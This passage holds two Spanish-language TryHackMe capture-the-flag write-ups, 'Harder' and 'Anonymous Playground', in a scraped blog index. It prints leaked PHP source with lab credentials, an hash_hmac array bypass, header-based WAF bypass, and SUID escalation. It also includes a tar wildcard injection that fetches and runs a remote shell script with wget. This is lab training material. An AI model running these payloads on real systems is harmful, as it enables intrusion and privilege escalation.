require(\u0026#34;auth.php\u0026#34;); $login = new Login; $login-\u0026gt;authorize(); require(\u0026#34;hmac.php\u0026#34;); require(\u0026#34;credentials.php\u0026#34;); ?\u0026gt; \u0026lt;table style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;url\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;username\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;password (cleartext)\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;\u0026lt;?php echo $creds[0]; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;\u0026lt;?php echo $creds[1]; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;\u0026lt;?php echo $creds[2]; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt;     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129  \u0026lt;?php define(\u0026#39;LOGIN_USER\u0026#39;, \u0026#34;admin\u0026#34;); define(\u0026#39;LOGIN_PASS\u0026#39;, \u0026#34;admin\u0026#34;); define(\u0026#39;LOGOUT_COMPLETE\u0026#39;, \u0026#34;You\u0026#39;ve been successfully logged out.\u0026#34;); define(\u0026#39;INCORRECT_USERNAME_PASSWORD\u0026#39;, \u0026#34;Invalid login credentials!\u0026#34;); define(\u0026#39;STARTER_GREETING\u0026#39;, \u0026#34;Harder Corp. - Password Manager\u0026#34;); define(\u0026#39;USERNAME\u0026#39;, \u0026#34;Username\u0026#34;); define(\u0026#39;PASSWORD\u0026#39;, \u0026#34;Password\u0026#34;); define(\u0026#39;ENTER_USERNAME\u0026#39;, \u0026#34;Enter Username\u0026#34;); define(\u0026#39;ENTER_PASSWORD\u0026#39;, \u0026#34;Enter Password\u0026#34;); define(\u0026#39;REMEMBER_THIS_COMPUTER\u0026#39;, \u0026#34;Remember this computer\u0026#34;); define(\u0026#39;BUTTON_LOGIN\u0026#39;, \u0026#34;Log in \u0026amp;rarr;\u0026#34;); // ================================================================================================ // ### DO NOT TOUCH ANYTHING BELOW THIS LINE ### // ================================================================================================  class Login { // unique prefix that is used with this object (on cookies and password salt)  var $prefix = \u0026#34;login_\u0026#34;; // days \u0026#34;remember me\u0026#34; cookies will remain  var $cookie_duration = 21; // temporary values for comparing login are auto set here. do not set your own $user or $pass here  var $user = \u0026#34;\u0026#34;; var $pass = \u0026#34;\u0026#34;; function authorize() { //save cookie info to session  if(isset($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])){ $_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;] = $_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;]; $_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;] = $_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;]; } //if setting vars  if(isset($_POST[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] == \u0026#34;set_login\u0026#34;){ $this-\u0026gt;user = $_POST[\u0026#39;user\u0026#39;]; $this-\u0026gt;pass = md5($this-\u0026gt;prefix.$_POST[\u0026#39;pass\u0026#39;]); //hash password. salt with prefix  $this-\u0026gt;check();//dies if incorrect  //if \u0026#34;remember me\u0026#34; set cookie  if(isset($_POST[\u0026#39;remember\u0026#39;])){ setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, $this-\u0026gt;user, time()+($this-\u0026gt;cookie_duration*86400));// (d*24h*60m*60s)  setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, $this-\u0026gt;pass, time()+($this-\u0026gt;cookie_duration*86400));// (d*24h*60m*60s)  } //set session  $_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;] = $this-\u0026gt;user; $_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;] = $this-\u0026gt;pass; } //if forced log in  elseif(isset($_GET[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;action\u0026#39;] == \u0026#34;prompt\u0026#34;){ session_unset(); session_destroy(); //destroy any existing cookie by setting time in past  if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); $this-\u0026gt;prompt(); } //if clearing the login  elseif(isset($_GET[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;action\u0026#39;] == \u0026#34;clear_login\u0026#34;){ session_unset(); session_destroy(); //destroy any existing cookie by setting time in past  if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); $msg = \u0026#39;\u0026lt;span class=\u0026#34;green\u0026#34;\u0026gt;\u0026#39;.LOGOUT_COMPLETE.\u0026#39;\u0026lt;/span\u0026gt;\u0026#39;; $this-\u0026gt;prompt($msg); } //prompt for  elseif(!isset($_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;]) || !isset($_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])){ $this-\u0026gt;prompt(); } //check the pw  else{ $this-\u0026gt;user = $_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;]; $this-\u0026gt;pass = $_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;]; $this-\u0026gt;check();//dies if incorrect  } } function check(){ if(md5($this-\u0026gt;prefix . LOGIN_PASS) != $this-\u0026gt;pass || LOGIN_USER != $this-\u0026gt;user){ //destroy any existing cookie by setting time in past  if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); session_unset(); session_destroy(); $msg=\u0026#39;\u0026lt;span class=\u0026#34;red\u0026#34;\u0026gt;\u0026#39;.INCORRECT_USERNAME_PASSWORD.\u0026#39;\u0026lt;/span\u0026gt;\u0026#39;; $this-\u0026gt;prompt($msg); } } function prompt($msg=\u0026#39;\u0026#39;){ ?\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;\u0026lt;?php echo STARTER_GREETING; ?\u0026gt;\u0026lt;/title\u0026gt;\t\u0026lt;style\u0026gt; [... REDACTED ...] \u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrapper\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;highlight\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;form class=\u0026#34;pure-form pure-form-stacked\u0026#34; action=\u0026#34;\u0026lt;?php echo $_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]; ?\u0026gt;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;fieldset\u0026gt; \u0026lt;legend\u0026gt;\u0026lt;?php if ($msg !== \u0026#39;\u0026#39;) { echo $msg; } else { echo STARTER_GREETING; } ?\u0026gt;\u0026lt;/legend\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;set_login\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;?php echo USERNAME; ?\u0026gt;:\u0026lt;/strong\u0026gt;\u0026lt;/label\u0026gt; --\u0026gt; \u0026lt;input id=\u0026#34;username\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;user\u0026#34; placeholder=\u0026#34;\u0026lt;?php echo ENTER_USERNAME; ?\u0026gt;\u0026#34; class=\u0026#34;pure-input-1\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;?php echo PASSWORD; ?\u0026gt;:\u0026lt;/strong\u0026gt;\u0026lt;/label\u0026gt; --\u0026gt; \u0026lt;input id=\u0026#34;password\u0026#34; type=\u0026#34;password\u0026#34; name=\u0026#34;pass\u0026#34; placeholder=\u0026#34;\u0026lt;?php echo ENTER_PASSWORD; ?\u0026gt;\u0026#34; class=\u0026#34;pure-input-1\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;remember\u0026#34; class=\u0026#34;pure-checkbox\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;remember\u0026#34; name=\u0026#34;remember\u0026#34; type=\u0026#34;checkbox\u0026#34;\u0026gt; \u0026lt;?php echo REMEMBER_THIS_COMPUTER; ?\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;pure-button pure-button-primary\u0026#34;\u0026gt;\u0026lt;?php echo BUTTON_LOGIN; ?\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026lt;?php exit;}} ?\u0026gt;       'use strict'; var containerId = JSON.parse(\"\\\"36c53649cb57bbe5\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Finalmente tenemos el archivo hmac.php, segun el codigo, este requiere de los parametros h, host y n, tambien utiliza el archivo secret.php para obtener la variable $secret que es utilizada para crear un hash sha256 con el parametro n y en la variable $hm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;?php if (empty($_GET[\u0026#39;h\u0026#39;]) || empty($_GET[\u0026#39;host\u0026#39;])) { header(\u0026#39;HTTP/1.0 400 Bad Request\u0026#39;); print(\u0026#34;missing get parameter\u0026#34;); die(); } require(\u0026#34;secret.php\u0026#34;); //set $secret var if (isset($_GET[\u0026#39;n\u0026#39;])) { $secret = hash_hmac(\u0026#39;sha256\u0026#39;, $_GET[\u0026#39;n\u0026#39;], $secret); } $hm = hash_hmac(\u0026#39;sha256\u0026#39;, $_GET[\u0026#39;host\u0026#39;], $secret); if ($hm !== $_GET[\u0026#39;h\u0026#39;]){ header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); print(\u0026#34;extra security check failed\u0026#34;); die(); } ?\u0026gt;   La solicitudo a la url quedaria de la siguiente forma /index.php?n=param1\u0026amp;h=hashdeHOST\u0026amp;host=HOST si deseamos obtener el contenido de index.php. Para ver el contenido necesitamos la variable $secret pero no tenemos acceso a dicha variable para crear el hash de $secret y $m. Necesitamos de alguna forma saltarnos $secret = hash_hmac('sha256', $_GET['n'], $secret); para que el parametro host (hash) sea el mismo que h (texto).\nSegun la documentacion de hash_hmac() se puede saltar esta funcion pasandole un array solo aparecería un error y la aplicacion continuaria ejecutandose. En el caso de $secret el valor de este se volveria NULL. Este se volveria False en $hm = hash_hmac('sha256', $_GET['host'], False /*$secret*/ ); por lo que podriamos crear un hash y pasarlo en h. Para pasar un array por una URL se puede realizar de la siguiente forma ?param[]=1\u0026amp;param[]=2.\nCreamos un hash con $hm = hash_hmac('sha256', 'sckull.io', False); utilizando PHP, segun lo anterior, nuestros parametros quedarian de la siguiente forma: n[]=1\u0026amp;h=33e89644bd7110e227fcddfa7a12b8a1c250e508b3f201532014a8ff63b67d5d\u0026amp;host=sckull.io. Al pasarlos al index nos muestra una tabla, donde vemos un subdominio y unas credenciales.\nHTTP HEADERS Visitamos el nuevo subdominio y nos muestra nuevamente el panel de pwd.\nIngresamos con las credenciales y nos muestra un mensaje en el que pide que la direccion IP esta permitida 10.10.10.X.\n1  Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el nuevo dominio, pero no encontramos algo interesante.\n1 2 3 4 5 6  kali@kali:~/tools/GitTools/Extractor$ gobuster dir -u http://shell.harder.local/ -w $LIST/dirb/common.txt -q -t 250 -x php,html,txt /auth.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /ip.php (Status: 200) /vendor (Status: 301)   Encontramos WAF BYPASS - OWASP (pag 16) en donde vemos como se puede realizar bypass a ciertas IPS que estan configuradas en el WAF, con los HEADER:\nX-Originating-IP X-Forwarded-For X-Remote-IP X-Remote-Addr Utilizamos esos HEADERS con una direccion IP (10.10.10.10) permitida y logramos encontrar que uno de estos funciona y logramos ver una pagina diferente.\nUSER - WWW En esta pagina encontramos una webshell en la cual podemos ejecutar comandos.\nEjecutamos una shell inversa y logramos obtener una shell con el usuario www.\nLogramos obtener nuestra flag user.txt.\nUSER - EVS Encontramos un archivo el cual contiene la contraseña del usuario evs el cual utilizamos para obtener una shell en el servicio SSH.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos SUID y encontramos el archivo /usr/local/bin/execute-crypted, al ver las strings de este archivo vemos un archivo sh.\nUtilizamos Ghidra y vemos el codigo del archivo el cual ejecuta /usr/local/bin/run-crypted.sh con el parametro que le pasemos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  undefined8 main(int param_1,long param_2) { long in_FS_OFFSET; char *local_18; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setuid(0); if (param_1 == 2) { asprintf(\u0026amp;local_18,\u0026#34;/usr/local/bin/run-crypted.sh %s\u0026#34;,*(undefined8 *)(param_2 + 8)); system(local_18); free(local_18); } else { system(\u0026#34;/usr/local/bin/run-crypted.sh\u0026#34;); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; }   El archivo run-crypted.sh ejecuta gpg junto con algunos parametros y el parametro que le se le pasa a execute-crypted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #!/bin/sh  if [ $# -eq 0 ] then echo -n \u0026#34;[*] Current User: \u0026#34;; whoami; echo \u0026#34;[-] This program runs only commands which are encypted for root@harder.local using gpg.\u0026#34; echo \u0026#34;[-] Create a file like this: echo -n whoami \u0026gt; command\u0026#34; echo \u0026#34;[-] Encrypt the file and run the command: execute-crypted command.gpg\u0026#34; else export GNUPGHOME=/root/.gnupg/ gpg --decrypt --no-verbose \u0026#34;$1\u0026#34; | ash fi   En este caso necesitamos la llave (.pub) para poder ejecutar comandos. Realizamos una busqueda de estos archivos (.pub) y logramos encontrar uno que podria ayudarmos.\nCreamos el archivo que contiene el comando whoami, con este archivo creamos una llave, lo ejecutamos y logramos ver que se ejecuta nuestro comando como root.\nEjecutamos un nuevo comando para cambiarle los permisos al contenido de la carpeta /root/*, logramos obtener la flag root.txt.\nSERVER FILES Vemos los archivos que no logramos ver en el repositorio.\n1 2 3  \u0026lt;?php $creds = array(\u0026#34;http://shell.harder.local\u0026#34;, \u0026#34;evs\u0026#34;, \u0026#34;9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm\u0026#34;); ?\u0026gt;   1 2 3 4 5  \u0026lt;?php $secret = \u0026#34;68b329da98[... REDACTED ...]b9c940\u0026#34;; ?\u0026gt;   ","description":"Harder es una maquina de TryHackMe, utilizamos GitTools para obtener el codigo fuente de la pagina lo cual nos dio credenciales para acceder al portal el cual realizamos Bypass al WAF con ello obtuvimos acceso a la maquina para luego cambiar al siguiente usuario en contraseñas almacenadas. Escalamos privilegios utilizando gpg y un binario con permisos SUID.","id":48,"section":"posts","tags":["gittools","suid"],"title":"TryHackMe - Harder","uri":"https://sckull.github.io/posts/harder/"},{"content":"  Anonymous Playground es una maquina de TryHackMe, inicialmente presenta un reto que mediante un script obtuvimos las credenciales para acceder al servicio SSH. Realizamos una pequeña explotacion de un archivo suid para realizar movimiento lateral. Finalmente utilizamos wildcards con tar para escalar privilegios.\nRoom    Titulo Anonymous Playground      Descripción Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?   Puntos 190   Dificultad Dificil   Maker Nameless0ne     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Mon Aug 17 16:53:27 2020 as: nmap -Pn -sV -o mini_scan anonymous.thm Nmap scan report for anonymous.thm (10.10.168.121) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 17 16:54:24 2020 -- 1 IP address (1 host up) scanned in 57.27 seconds   HTTP Encontramos una pagina web en el puerto 80.\nEn la pagina Operatives se muestra una lista de posibles usuarios.\nEn el codigo fuente de la imagen encontramos un comentario en el cual vemos una direccion de una pagina, dicha pagina no existe.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  kali@kali:~/thm/anonymousplayground$ gobuster dir -u http://anonymous.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250 -q -x php,html,txt /index.php (Status: 200) /images (Status: 301) /js (Status: 301) /robots.txt (Status: 200)   En robots.txt encontramos una direccion que al visitarla nos muestra un mensaje.\nEn esta ultima pagina encontramos un cookie el cual está configurado en denied.\nLe cambiamos el valor a granted utilizando firefox.\nRecargamos la pagina y ahora nos muestra el siguiente mensaje, al parecer es un mensaje codificado.\nMAGNA - USER Intenamos con los diferentes bases y ciphers pero no logramos obtener ningun valor interesante, en la plataforma nos da una pista donde el valor zA es a:\n1  You\u0026#39;re going to want to write a Python script for this. \u0026#39;zA\u0026#39; = \u0026#39;a\u0026#39;   Podemos ver que zA = a eso quiere decir que cada par de letras tiene un valor, de tal forma que quedaria de la siguiente forma si reemplazamos zA, pero solo tenemos el valor de a.\n1 2  - hE zA dC fH zA::hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN + hE a dC fH a ::hE a dC fH a hA iJ a eI aD jB cB hH gA a fH fN   La cantidad de caracteres al decodificarlo quedaria de la siguiente forma 5::17. Los usuarios que encontramos ninguno de ellos tiene más de 17 caracteres pero si encontramos cuatro de ellos que tienen 5 caracteres (['ninja', 'jammy', 'magna', 'skidy']) por lo que quizas la primera parte de la codificacion tenga uno de los usuarios y posiblemente la segunda, una contraseña.\nEn la primera parte tenemos 5 caracteres para un \u0026ldquo;usuario\u0026rdquo;, segun la pista la primera parte tiene dos a y entre los usuarios solo magna tiene la misma letra en la misma posision, por lo que el valor hE posiblemente pertenezca a m y asi con los valores siguientes.\n1 2 3  - hE zA dC fH zA + hE a dC fH a + m a g n a   Escribimos un pequeño script el cual utiliza un numero (n) para poder encontrar la letra m (con chr()), utilizando los valores unicode del par de letras (con ord()), sumando el valor de cada uno de ellos y restando o sumando el numero (n).\n1 2 3 4 5 6  \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;h\u0026#39;) 104 \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;E\u0026#39;) 69 #Valor Esperado con la \u0026#34;formula\u0026#34; chr(104 + 69 +/- n) = \u0026#34;m\u0026#34;   Hay que tomar en cuenta que el valor zA es a:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #\u0026#34;Credentials\u0026#34; encoded_cred = \u0026#34;hE zA dC fH zA\u0026#34;.split(\u0026#39; \u0026#39;) #USERS users = open(\u0026#39;users.txt\u0026#39;,\u0026#39;r\u0026#39;) users = [x.rstrip() for x in users] users = [x for x in users if len(x) == 5] def decode(num, lista): tmp = \u0026#34;\u0026#34; for i in lista: if i == \u0026#34;zA\u0026#34;: tmp = tmp + \u0026#34;a\u0026#34; else: tmp = tmp + str(chr( ord(i[0]) + ord(i[1]) - num)) return(tmp) for i in range(0, 256): value = ord(\u0026#39;h\u0026#39;) + ord(\u0026#39;E\u0026#39;) - i\tif value in range(90,123): if chr(value) == \u0026#34;m\u0026#34;: print(\u0026#34;Posible numero: \u0026#34; + str(i)) print(decode(i, encoded_cred))   Al ejecutar el script nos devuelve el numero que se puede utilizar para encontrar el valor de m el cual utilizamos para decodificar la primera parte, y el resultado fue magna.\n1 2 3  kali@kali:~/thm/anonymousplayground$ python creds.py Posible numero: 64 magna   Realizamos lo mismo pero ahora con la segunda parte:\n1 2 3  encoded_cred_two = \u0026#34;hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN\u0026#34;.split(\u0026#39; \u0026#39;) encoded_cred = \u0026#34;hE zA dC fH zA\u0026#34;.split(\u0026#39; \u0026#39;) print(decode(64, encoded_cred) + \u0026#34;::\u0026#34; + decode(64, encoded_cred_two))   Utilizamos estas \u0026ldquo;credenciales\u0026rdquo; en el servicio SSH y logramos obtener una shell y nuestra primera flag.txt.\nUSER - SPOOKY En la carpeta principal encontramos una nota en el cual indica que Spooky hizo un binario en C y que en la maquina esta installado radare2 y gdb para poder realizarle un reversing:\n1 2 3 4 5 6 7 8 9  Hey Magna, Check out this binary I made! I\u0026#39;ve been practicing my skills in C so that I can get better at Reverse Engineering and Malware Development. I think this is a really good start. See if you can break it! P.S. I\u0026#39;ve had the admins install radare2 and gdb so you can debug and reverse it right here! Best, Spooky   El binario se encuentra en la carpeta principal.\nUtilizamos radare2, vemos varias funciones interesantes como sym.main y sym.call_bash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  [0x00400570]\u0026gt; afl 0x00400000 3 72 -\u0026gt; 73 sym.imp.__libc_start_main 0x004004e0 3 23 sym._init 0x00400510 1 6 sym.imp.puts 0x00400520 1 6 sym.imp.system 0x00400530 1 6 sym.imp.printf 0x00400540 1 6 sym.imp.gets 0x00400550 1 6 sym.imp.setuid 0x00400560 1 6 sym.imp.sleep 0x00400570 1 43 entry0 0x004005a0 1 2 sym._dl_relocate_static_pie 0x004005b0 3 35 sym.deregister_tm_clones 0x004005e0 3 53 sym.register_tm_clones 0x00400620 3 34 -\u0026gt; 29 sym.__do_global_dtors_aux 0x00400650 1 7 entry1.init 0x00400657 1 129 sym.call_bash 0x004006d8 1 56 sym.main 0x00400710 4 101 sym.__libc_csu_init 0x00400780 1 2 sym.__libc_csu_fini 0x00400784 1 9 sym._fini [0x00400570]\u0026gt;   En sym.main vemos que simplemente realiza una impresion y pregunta por algo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  [0x00400570]\u0026gt; pdf @sym.main ;-- main: / (fcn) sym.main 56 | sym.main (); | ; var int local_50h @ rbp-0x50 | ; var int local_44h @ rbp-0x44 | ; var int local_40h @ rbp-0x40 | ; DATA XREF from 0x0040058d (entry0) | 0x004006d8 55 push rbp | 0x004006d9 4889e5 mov rbp, rsp | 0x004006dc 4883ec50 sub rsp, 0x50 ; \u0026#39;P\u0026#39; | 0x004006e0 897dbc mov dword [local_44h], edi | 0x004006e3 488975b0 mov qword [local_50h], rsi | 0x004006e7 488d3d1d0100. lea rdi, qword str.Who_do_you_want_to_hack ; 0x40080b ; \u0026#34;Who do you want to hack? \u0026#34; | 0x004006ee b800000000 mov eax, 0 | 0x004006f3 e838feffff call sym.imp.printf ; int printf(const char *format) | 0x004006f8 488d45c0 lea rax, qword [local_40h] | 0x004006fc 4889c7 mov rdi, rax | 0x004006ff b800000000 mov eax, 0 | 0x00400704 e837feffff call sym.imp.gets ; char*gets(char *s) | 0x00400709 b800000000 mov eax, 0 | 0x0040070e c9 leave \\  0x0040070f c3 ret   En sym.call_bash vemos que realiza varias impresiones y al final ejecuta /bin/sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  [0x00400570]\u0026gt; pdf @sym.call_bash / (fcn) sym.call_bash 129 | sym.call_bash (); | 0x00400657 55 push rbp | 0x00400658 4889e5 mov rbp, rsp | 0x0040065b 488d3d360100. lea rdi, qword str.We_are_Anonymous. ; 0x400798 ; \u0026#34;\\nWe are Anonymous.\u0026#34; | 0x00400662 e8a9feffff call sym.imp.puts ; int puts(const char *s) | 0x00400667 bf01000000 mov edi, 1 | 0x0040066c e8effeffff call sym.imp.sleep ; int sleep(int s) | 0x00400671 488d3d330100. lea rdi, qword str.We_are_Legion. ; 0x4007ab ; \u0026#34;We are Legion.\u0026#34; | 0x00400678 e893feffff call sym.imp.puts ; int puts(const char *s) | 0x0040067d bf01000000 mov edi, 1 | 0x00400682 e8d9feffff call sym.imp.sleep ; int sleep(int s) | 0x00400687 488d3d2c0100. lea rdi, qword str.We_do_not_forgive. ; 0x4007ba ; \u0026#34;We do not forgive.\u0026#34; | 0x0040068e e87dfeffff call sym.imp.puts ; int puts(const char *s) | 0x00400693 bf01000000 mov edi, 1 | 0x00400698 e8c3feffff call sym.imp.sleep ; int sleep(int s) | 0x0040069d 488d3d290100. lea rdi, qword str.We_do_not_forget. ; 0x4007cd ; \u0026#34;We do not forget.\u0026#34; | 0x004006a4 e867feffff call sym.imp.puts ; int puts(const char *s) | 0x004006a9 bf01000000 mov edi, 1 | 0x004006ae e8adfeffff call sym.imp.sleep ; int sleep(int s) | 0x004006b3 488d3d260100. lea rdi, qword str.Message_corrupted_...Well...done. ; 0x4007e0 ; \u0026#34;[Message corrupted]...Well...done.\u0026#34; | 0x004006ba e851feffff call sym.imp.puts ; int puts(const char *s) | 0x004006bf bf39050000 mov edi, 0x539 ; 1337 | 0x004006c4 e887feffff call sym.imp.setuid | 0x004006c9 488d3d330100. lea rdi, qword str.bin_sh ; 0x400803 ; \u0026#34;/bin/sh\u0026#34; | 0x004006d0 e84bfeffff call sym.imp.system ; int system(const char *string) | 0x004006d5 90 nop | 0x004006d6 5d pop rbp \\  0x004006d7 c3 ret [0x00400570]\u0026gt;   Para entenderlo con más claridad utilizamos Ghidra y vemos el codigo fuente de ambas funciones, en main vemos que el valor de la variable local_48 tiene un tamaño de 64 y la segunda funcion simplemente realiza impresiones y una ejecucion:\n1 2 3 4 5 6 7 8 9  undefined8 main(void) { char local_48 [64]; printf(\u0026#34;Who do you want to hack? \u0026#34;); gets(local_48); return 0; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  void call_bash(void) { puts(\u0026#34;\\nWe are Anonymous.\u0026#34;); sleep(1); puts(\u0026#34;We are Legion.\u0026#34;); sleep(1); puts(\u0026#34;We do not forgive.\u0026#34;); sleep(1); puts(\u0026#34;We do not forget.\u0026#34;); sleep(1); puts(\u0026#34;[Message corrupted]...Well...done.\u0026#34;); setuid(0x539); //1337  system(\u0026#34;/bin/sh\u0026#34;); return; }   Realizando la ejecucion del binario logramos obtener el mensaje Segmentation fault y el offset. Sabiendo el offset vamos a poder realizar la llamada a la funcion call_bash.\nLogramos obtener una shell con el usuario Spooky.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en el archivo /etc/crontab y encontramos que existe un cron que es ejecutado por el usuario root el cual realiza un backup de todo lo que se encuentre en /home/spooky.\nUtilizamos los \u0026ldquo;parametros\u0026rdquo; para explotar esta vulnerabilidad creando un archivo que contenga nuestra shell inversa, y creamos los \u0026ldquo;parametros\u0026rdquo; los cuales van a ejecutar nuestra shell al igual que en la maquina CMESS - THM.\n1 2 3  echo \u0026#39;bash -c \u0026#34;$(wget -qO- http://10.2.29.162/shell.sh)\u0026#34; \u0026#39; \u0026gt; shell.sh echo \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026#34;\u0026#34; \u0026gt; --checkpoint=1   Creamos nuestra shell en nuestra maquina, ponemos a la escucha netcat y logramos obtener nuestra shell con usuario root y nuestra flag root.txt.\n","description":"Anonymous Playground es una maquina de TryHackMe, inicialmente presenta un reto que mediante un script obtuvimos las credenciales para acceder al servicio SSH. 